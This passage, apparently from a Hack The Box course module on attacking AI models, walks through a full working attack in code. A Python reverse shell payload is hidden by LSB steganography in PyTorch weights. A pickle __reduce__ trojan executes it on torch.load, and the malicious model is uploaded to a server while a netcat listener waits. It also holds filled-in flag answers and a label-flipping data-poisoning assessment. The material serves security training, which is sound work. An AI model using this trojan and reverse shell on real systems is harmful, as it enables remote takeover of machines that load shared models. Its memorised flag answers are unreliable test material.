If `payload_len_bytes` is zero, it indicates no payload is present, and an empty byte string is returned. Otherwise, `get_bits` is called again to retrieve `payload_len_bytes * 8` bits, which constitute the actual payload. The `get_bits` function seamlessly continues from where it left off, thanks to the persisted `shared_state['element_index']`.

```python
    if payload_len_bytes == 0:
        print(f"Decoded length is 0. Returning empty bytes. Processed {shared_state['element_index']} elements for length.")
        return b""  # No payload if length is zero

    try:
        payload_bits = get_bits(payload_len_bytes * 8)  # Decode the actual payload
    except ValueError as e:
        raise ValueError(f"Failed to decode payload (length: {payload_len_bytes} bytes): {e}")
```

The extracted `payload_bits` are then reconstructed into bytes. We iterate through `payload_bits`, accumulating them into `current_byte_val`. When 8 bits are collected (tracked by `bit_count`), the complete byte is appended to `decoded_bytes` (a `bytearray`), and the accumulators are reset.

```python
    decoded_bytes = bytearray()
    current_byte_val = 0
    bit_count = 0

    for bit in payload_bits:
        current_byte_val = (current_byte_val << 1) | bit
        bit_count += 1
        if bit_count == 8:  # A full byte has been assembled
            decoded_bytes.append(current_byte_val)
            current_byte_val = 0  # Reset for the next byte
            bit_count = 0  # Reset bit counter
```

Finally, the `decoded_bytes` bytearray is converted to an immutable `bytes` object and returned, completing the data extraction.

```python
    print(f"Decoded {len(decoded_bytes)} bytes. Used {shared_state['element_index']} tensor elements with {num_lsb} LSB(s) per element.")
    return bytes(decoded_bytes)
```

---

<!-- section 3663 | page 24 | group: Pickles and Steganography | type: interactive -->

# The Attack

---

Having established a target model (`state_dict` saved) and developed our steganographic tools (`encode_lsb`, `decode_lsb`), we now move onto the main phase of the attack.

## The Payload

The first step is to define the code we ultimately want to execute on the target's machine. We'll be using a classic `reverse shell`. It establishes a connection from the target machine back to a listener controlled by us, granting us interactive command-line access.

We must configure the connection parameters within the payload code itself. `HOST_IP` needs to be the IP address of our listener machine, ensuring it's `reachable from the environment where target will load the model`. `LISTENER_PORT` specifies the corresponding port our listener will monitor.

```python
import socket, subprocess, os, pty, sys, traceback  # Imports needed by payload

# Configure connection details for the reverse shell
# Use the IP/DNS name of the machine running the listener, accessible FROM your target instance,
HOST_IP = "localhost"  # THIS IS YOUR IP WHEN ON THE HTB NETWORK
LISTENER_PORT = 4444  # The port that you will listen for a connection on

print(f"--- Payload Configuration ---")
print(f"Payload will target: {HOST_IP}:{LISTENER_PORT}")
print(f"-----------------------------")
```

The `payload_code_string` itself contains Python code implementing the reverse shell logic. It attempts to connect to the specified attacker IP and port, and upon a successful connection, it redirects standard input, output, and error streams to the socket and spawns a shell (e.g., `/bin/bash`).

```python
# The payload string itself
payload_code_string = f"""
import socket, subprocess, os, pty, sys, traceback
print("[PAYLOAD] Payload starting execution.", file=sys.stderr); sys.stderr.flush()
attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
print(f"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}...", file=sys.stderr); sys.stderr.flush()
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
    print("[PAYLOAD] Connection successful.", file=sys.stderr); sys.stderr.flush()
    print("[PAYLOAD] Redirecting stdio...", file=sys.stderr); sys.stderr.flush()
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    shell = os.environ.get('SHELL', '/bin/bash')
    print(f"[PAYLOAD] Spawning shell: {{shell}}", file=sys.stderr); sys.stderr.flush() # May not be seen
    pty.spawn([shell]) # Start interactive shell
except socket.timeout: print(f"[PAYLOAD] ERROR: Connection timed out.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except ConnectionRefusedError: print(f"[PAYLOAD] ERROR: Connection refused.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except Exception as e: print(f"[PAYLOAD] ERROR: Unexpected error: {{e}}", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print("[PAYLOAD] Payload script finishing.", file=sys.stderr); sys.stderr.flush()
    if s:
        try: s.close()
        except: pass
    os._exit(1) # Force exit
"""

```

Once the payload string is defined, it's encoded into bytes using UTF-8. This byte representation is what will be hidden using steganography.

```python
# Encode payload for steganography
payload_bytes_to_hide = payload_code_string.encode("utf-8")
print(f"Payload defined and encoded to {len(payload_bytes_to_hide)} bytes.")
```
## Embedding the Payload

With the payload prepared as `payload_bytes_to_hide`, the next step is to embed it into the parameters of our target model.

```python
import torch   # Ensure torch is imported
import os      # Ensure os is imported for file checks

NUM_LSB = 2    # Number of LSBs to use
```

We begin by loading the "legitimate" `state_dict` we saved earlier (`legitimate_state_dict_file`) back into memory using `torch.load()`.

```python
# Load the legitimate state dict
legitimate_state_dict_file = "victim_model_state.pth"
if not os.path.exists(legitimate_state_dict_file):
    raise FileNotFoundError(
        f"Legitimate state dict '{legitimate_state_dict_file}' not found."
    )

print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")
loaded_state_dict = torch.load(legitimate_state_dict_file)  # Load the dictionary
print("State dict loaded successfully.")
```

We then select the specific tensor within this dictionary that will serve as the carrier for our hidden data. We'll be using `large_layer.weight` (identified by `target_key`). Its substantial size makes it suitable for hiding our payload without excessive modification density. We retrieve this original tensor (`original_target_tensor`).

```python
# Choose a target layer/tensor for embedding
target_key = "large_layer.weight"
if target_key not in loaded_state_dict:
    raise KeyError(
        f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
    )

original_target_tensor = loaded_state_dict[target_key]
print(
    f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
)
```

We need to ensure we have the capacity within the target tensor to embed the payload, and to do this, we calculate precisely how many elements within the `original_target_tensor` are required to store the `payload_bytes_to_hide` (plus the 4-byte length prefix) using the chosen number of least significant bits (`NUM_LSB`). If the tensor's element count (`numel`) is less than the `elements_needed`, the operation cannot succeed.

```python
# Ensure the payload isn't too large for the chosen tensor
bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4 bytes for length prefix
bits_needed = bytes_to_embed * 8
elements_needed = (bits_needed + NUM_LSB - 1) // NUM_LSB  # Ceiling division
print(f"Payload requires {elements_needed} elements using {NUM_LSB} LSBs.")

if original_target_tensor.numel() < elements_needed:
    raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")
```

Provided the capacity is adequate, we invoke our `encode_lsb` function. It takes the `original_target_tensor`, our `payload_bytes_to_hide`, and `NUM_LSB` as input. The function performs the LSB encoding and returns `modified_target_tensor`. This modified tensor is then placed into a copy of the original `state_dict`. This `modified_state_dict` is now compromised, containing payload.

```python
# Encode the payload into the target tensor
print(f"\nEncoding payload into tensor '{target_key}'...")
try:
    modified_target_tensor = encode_lsb(
        original_target_tensor, payload_bytes_to_hide, NUM_LSB
    )
    print("Encoding complete.")

    # Replace the original tensor with the modified one in the dictionary
    modified_state_dict = (
        loaded_state_dict.copy()
    )  # Don't modify the original loaded dict directly
    modified_state_dict[target_key] = modified_target_tensor
    print(f"Replaced '{target_key}' in state dict with modified tensor.")

except Exception as e:
    print(f"Error during encoding or state dict modification: {e}")
    raise  # Re-raise the exception
```
## The Trigger

As we know, Python’s arbitrary-code execution vector arises from the way `pickle` calls an object’s `__reduce__` method. We'll define `TrojanModelWrapper` to exploit this vulnerability.

The `__init__` constructor merely stores the altered `state_dict`, the dictionary key that hides the payload (for instance `"large_layer.weight"`), and the least-significant-bit depth used for encoding, values that `__reduce__` will later need.

```python
import pickle
import torch
import struct
import traceback
import os
import pty
import socket
import sys
import subprocess


class TrojanModelWrapper:
    """
    A malicious wrapper class designed to act as a Trojan.
    """

    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        """
        Initializes the wrapper, pickling the state_dict for embedding.
        """
        print(
            f"  [Wrapper Init] Received modified state_dict with {len(modified_state_dict)} keys."
        )
        print(f"  [Wrapper Init] Received target_key: '{target_key}'")
        print(f"  [Wrapper Init] Received num_lsb: {num_lsb}")

        if target_key not in modified_state_dict:
            raise ValueError(
                f"target_key '{target_key}' not found in the provided state_dict."
            )
        if not isinstance(modified_state_dict[target_key], torch.Tensor):
            raise TypeError(f"Value at target_key '{target_key}' is not a Tensor.")
        if modified_state_dict[target_key].dtype != torch.float32:
            raise TypeError(f"Tensor at target_key '{target_key}' is not float32.")
        if not 1 <= num_lsb <= 8:
            raise ValueError("num_lsb must be between 1 and 8.")

        try:
            self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
            print(
                f"  [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)} bytes)."
            )
        except Exception as e:
            print(f"--- Error pickling state_dict ---")
            print(f"Error: {e}")
            raise RuntimeError(
                "Failed to pickle state_dict for embedding in wrapper."
            ) from e

        self.target_key = target_key
        self.num_lsb = num_lsb
        print(
            "  [Wrapper Init] Initialization complete. Wrapper is ready to be pickled."
        )

    def get_state_dict(self):
        try:
            return pickle.loads(self.pickled_state_dict_bytes)
        except Exception as e:
            print(f"Error deserializing internal state_dict: {e}")
            return None

```

The `__reduce__` method is what we are most interested in. Here, we replace ordinary reconstruction instructions with `(exec, (loader_code,))`, telling the unpickler to run a crafted string instead of rebuilding a harmless object. That string is assembled on the fly: it contains the entire pickled `state_dict`, the target key, the LSB parameter, and the source for a small `decode_lsb` helper. When `exec` runs it during deserialization, the code recreates the dictionary, pulls out the tensor at the embedded key, extracts the hidden bytes with `decode_lsb`, converts them back to the original payload (a reverse shell), and executes it. 

Because everything: data, parameters, helper function, and trigger, is folded into one contiguous string, the attack travels as a single self-contained file.

```python
    def __reduce__(self):
        """
        Exploits pickle deserialization to execute embedded loader code.
        """
        print(
            "\n[!] TrojanModelWrapper.__reduce__ activated (likely during pickling/saving process)!"
        )
        print("    Preparing loader code string...")

        # Embed the decode_lsb function source code.
        decode_lsb_source = """
import torch, struct, pickle, traceback
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    if tensor_modified.dtype != torch.float32: raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8: raise ValueError("num_lsb must be 1-8.")
    tensor_flat = tensor_modified.flatten(); n_elements = tensor_flat.numel(); element_index = 0
    def get_bits(count: int) -> list[int]:
        nonlocal element_index; bits = []
        while len(bits) < count:
            if element_index >= n_elements: raise ValueError(f"Tensor ended prematurely trying to read {count} bits.")
            current_float = tensor_flat[element_index].item();
            try: packed_float = struct.pack('>f', current_float); int_representation = struct.unpack('>I', packed_float)[0]
            except struct.error: element_index += 1; continue
            mask = (1 << num_lsb) - 1; lsb_data = int_representation & mask
            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1; bits.append(bit)
                if len(bits) == count: break
            element_index += 1
        return bits
    try:
        length_bits = get_bits(32); length_int = 0
        for bit in length_bits: length_int = (length_int << 1) | bit
        payload_len_bytes = length_int
        if payload_len_bytes == 0: return b''
        if payload_len_bytes < 0: raise ValueError(f"Decoded negative length: {payload_len_bytes}")
        payload_bits = get_bits(payload_len_bytes * 8)
        decoded_bytes = bytearray(); current_byte_val = 0; bit_count = 0
        for bit in payload_bits:
            current_byte_val = (current_byte_val << 1) | bit; bit_count += 1
            if bit_count == 8: decoded_bytes.append(current_byte_val); current_byte_val = 0; bit_count = 0
        return bytes(decoded_bytes)
    except ValueError as e: raise ValueError(f"Embedded LSB Decode failed: {e}") from e
    except Exception as e_inner: raise RuntimeError(f"Unexpected Embedded LSB Decode error: {e_inner}") from e_inner
"""

        # Embed necessary data
        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)
        embedded_target_key = repr(self.target_key)
        embedded_num_lsb = self.num_lsb
        print(
            f"  [Reduce] Embedding {len(self.pickled_state_dict_bytes)} bytes of pickled state_dict."
        )

        # Construct the loader code string
        loader_code = f"""
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
print('[+] Trojan Wrapper: Loader code execution started.', file=sys.stderr); sys.stderr.flush()
{decode_lsb_source}
print('[+] Trojan Wrapper: Embedded decode_lsb function defined.', file=sys.stderr); sys.stderr.flush()
pickled_state_dict_bytes = {pickled_state_dict_literal}
target_key = {embedded_target_key}
num_lsb = {embedded_num_lsb}
print(f'[+] Trojan Wrapper: Embedded data retrieved (state_dict size={{len(pickled_state_dict_bytes)}}, target_key={{target_key!r}}, num_lsb={{num_lsb}}).', file=sys.stderr); sys.stderr.flush()
try:
    print('[+] Trojan Wrapper: Deserializing embedded state_dict...', file=sys.stderr); sys.stderr.flush()
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    if not isinstance(reconstructed_state_dict, dict):
        raise TypeError("Deserialized object is not a dictionary (state_dict).")
    print(f'[+] Trojan Wrapper: State_dict reconstructed successfully ({{len(reconstructed_state_dict)}} keys).', file=sys.stderr); sys.stderr.flush()
    if target_key not in reconstructed_state_dict:
        raise KeyError(f"Target key '{{target_key}}' not found in reconstructed state_dict.")
    payload_tensor = reconstructed_state_dict[target_key]
    if not isinstance(payload_tensor, torch.Tensor):
         raise TypeError(f"Value for key '{{target_key}}' is not a Tensor.")
    print(f'[+] Trojan Wrapper: Located payload tensor (key={{target_key!r}}, shape={{payload_tensor.shape}}).', file=sys.stderr); sys.stderr.flush()
    print(f'[+] Trojan Wrapper: Decoding hidden payload from tensor using {{num_lsb}} LSBs...', file=sys.stderr); sys.stderr.flush()
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    print(f'[+] Trojan Wrapper: Payload decoded successfully ({{len(extracted_payload_bytes)}} bytes).', file=sys.stderr); sys.stderr.flush()
    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
    print('[!] Trojan Wrapper: Executing final decoded payload (reverse shell)...', file=sys.stderr); sys.stderr.flush()
    exec(extracted_payload_code, globals(), locals())
    print('[!] Trojan Wrapper: Payload execution initiated.', file=sys.stderr); sys.stderr.flush()

except Exception as e:
    print(f'[!!!] Trojan Wrapper: FATAL ERROR during loader execution: {{e}}', file=sys.stderr);
    traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print('[+] Trojan Wrapper: Loader code sequence finished.', file=sys.stderr); sys.stderr.flush()
"""
        print("  [Reduce] Loader code string constructed with escaped inner braces.")
        print("  [Reduce] Returning (exec, (loader_code,)) tuple to pickle.")
        return (exec, (loader_code,))


print("TrojanModelWrapper class defined.")
```

---

<!-- section 3664 | page 25 | group: Pickles and Steganography | type: interactive -->

# Execute the Attack

---

To actually execute the attack, we first need to create an instance of `TrojanModelWrapper`, and pass the entire `modified_state_dict` to its constructor, along with the `target_key` (specifying which tensor holds the payload, e.g., `"large_layer.weight"`), as well as the `NUM_LSB` used for encoding. The wrapper's `__init__` method pickles this entire `state_dict` and stores the resulting bytes internally.

We then save this `wrapper_instance` object to our final malicious file (`final_malicious_file`) using `torch.save()`. This file now contains the pickled representation of the `TrojanModelWrapper`.

```python
# Ensure the modified state dict exists from the embedding step
if "modified_state_dict" not in locals() or not isinstance(modified_state_dict, dict):
    raise NameError(
        "Critical Error: 'modified_state_dict' not found or invalid. Cannot create wrapper."
    )
# Ensure the target key used for embedding is correctly defined
if "target_key" not in locals():
    raise NameError(
        "Critical Error: 'target_key' variable not defined. Cannot create wrapper."
    )

print(f"\n--- Instantiating TrojanModelWrapper ---")
try:
    # Create an instance of our wrapper class.
    # Pass the entire modified state dictionary, the key identifying the
    # payload tensor within that dictionary, and the LSB count.
    # The wrapper's __init__ pickles the state_dict internally.
    wrapper_instance = TrojanModelWrapper(
        modified_state_dict=modified_state_dict,
        target_key=target_key,
        num_lsb=NUM_LSB,
    )
    print("TrojanModelWrapper instance created successfully.")
    print(
        "The wrapper instance now internally holds the pickled bytes of the entire modified state_dict."
    )

except Exception as e:
    print(f"\n--- Error Instantiating Wrapper ---")
    print(f"Error: {e}")
    raise SystemExit("Failed to instantiate TrojanModelWrapper.") from e


# Define the filename for our final malicious artifact
final_malicious_file = "malicious_trojan_model.pth"

print(f"\n--- Saving the Trojan Wrapper Instance to '{final_malicious_file}' ---")
try:
    torch.save(wrapper_instance, final_malicious_file)
    print(
        f"Final malicious Trojan file saved successfully to '{final_malicious_file}'."
    )
    print(f"File size: {os.path.getsize(final_malicious_file)} bytes.")

except Exception as e:
    # Catch potential errors during the final save operation
    print(f"\n--- Error Saving Final Malicious File ---")
    import traceback

    traceback.print_exc()
    print(f"Error details: {e}")
    raise SystemExit("Failed to save the final malicious wrapper file.") from e
```

The only thing left is to execute the attack.

First we need to double-check the payload configuration. We must ensure the `HOST_IP` variable, set earlier when defining the payload, correctly points to the IP address of the machine where we will run our listener, and that this IP is reachable from the target's environment. Next, we start a network listener on our machine to catch the incoming reverse shell. 

A common tool for this is `netcat`; run `nc -lvnp 4444`.

With the listener active, we upload our malicious model file to the spawned instance. The application exposes an `/upload` endpoint designed to receive model files. Use the Python script below (or a tool like `curl`) to perform the upload via an HTTP POST request.

```python
import requests
import os
import traceback

api_url = "http://localhost:5555/upload"  # Replace with instance details

pickle_file_path = final_malicious_file

print(f"Attempting to upload '{pickle_file_path}' to '{api_url}'...")

# Check if the malicious pickle file exists locally
if not os.path.exists(pickle_file_path):
    print(f"\nError: File not found at '{pickle_file_path}'.")
    print("Please ensure the file exists in the specified path.")
else:
    print(f"File found at '{pickle_file_path}'. Preparing upload...")
    # Prepare the file for upload in the format requests expects
    # The key 'model' must match the key expected by the Flask app (request.files['model'])
    files_to_upload = {
        "model": (
            os.path.basename(pickle_file_path),
            open(pickle_file_path, "rb"),
            "application/octet-stream",
        )
    }

    try:
        # Send the POST request with the file
        print("Sending POST request...")
        response = requests.post(api_url, files=files_to_upload)

        # Print the server's response details
        print("\n--- Server Response ---")
        print(f"Status Code: {response.status_code}")
        try:
            # Try to print JSON response if available
            print("Response JSON:")
            print(response.json())
        except requests.exceptions.JSONDecodeError:
            # Otherwise, print raw text response
            print("Response Text:")
            print(response.text)
        print("--- End Server Response ---")

        if response.status_code == 200:
            print(
                "\nUpload successful (HTTP 200). Check your listener for a connection."
            )
        else:
            print(
                f"\nUpload failed or server encountered an error (Status code: {response.status_code})."
            )

    except requests.exceptions.ConnectionError as e:
        print(f"\n--- Connection Error ---")
        print(f"Could not connect to the server at '{api_url}'.")
        print("Please ensure:")
        print("  1. The API URL is correct.")
        print("  2. Your target instance is running and the port is mapped correctly.")
        print("  3. There are no network issues (e.g., firewall).")
        print("  4. You have a listener running for the connection.")
        print(f"Error details: {e}")
        print("--- End Connection Error ---")

    except Exception as e:
        print(f"\n--- An unexpected error occurred during upload ---")
        traceback.print_exc()
        print(f"Error details: {e}")
        print("--- End Unexpected Error ---")

    finally:
        # Ensure the file handle opened for upload is closed
        if "files_to_upload" in locals() and "model" in files_to_upload:
            try:
                files_to_upload["model"][1].close()
                # print("Closed file handle for upload.")
            except Exception as e_close:
                print(f"Warning: Error closing file handle: {e_close}")

print("\nUpload script finished.")
```

Upon successful upload, the server will attempt to load the model using `torch.load()`.

We should see an incoming connection on our `nc` listener. Once we have the shell connection, we can navigate the target's system to find and retrieve the flag (`cat /app/flag.txt`).

### Questions (section)
- {"id": 3091, "question": "Using the reverse shell to your target instance, retrieve the flag in flag.txt and submit it as the answer to this question.", "hint": null, "file": null, "has_file": false, "protocol": null, "username": null, "password": null, "order": null, "cubes": 2, "experience_points": 60, "userAnswer": "HTB{D0ck3r1z3d_P1ckl3_Sh3ll_!n_Th3_M0d3l}", "user_answer": "HTB{D0ck3r1z3d_P1ckl3_Sh3ll_!n_Th3_M0d3l}"}


---

<!-- section 3665 | page 26 | group: Skills Assessment | type: interactive -->

# Skills Assessment

---

Your objective in this assessment is to strategically manipulate a model's training data to achieve a specific, nuanced misclassification behavior. 

You will be provided a dataset in the zip attached to the question, along with a template notebook.

You will target a 4-class `One-vs-Rest` (`OvR`) `Logistic Regression` classifier. The goal is to poison its training dataset using only label flipping such that the subsequently trained model exhibits ambiguous classification for instances of `Class 1`. In other words, when the poisoned model encounters new data points that genuinely belong to `Class 1`, it should frequently misclassify them as either `Class 0` or `Class 2`, degrading the classification accuracy of `Class 1`.

Implement your attack strategy within the provided template notebook and use the same notebook to submit your poisoned model to the instancea api for evaluation.

### Questions (section)
- {"id": 3096, "question": "Submit the flag you receive from a successful attack as the answer to this question.", "hint": null, "file": "https://cdn.services-k8s.prod.aws.htb.systems/content/questions/file/603de7b3-e5f0-4c7b-96bd-737031aaba20-1779783353.zip", "has_file": true, "protocol": null, "username": null, "password": null, "order": null, "cubes": 7, "experience_points": 60, "userAnswer": "HTB{4mbiguity_m4st3r}", "user_answer": "HTB{4mbiguity_m4st3r}"}
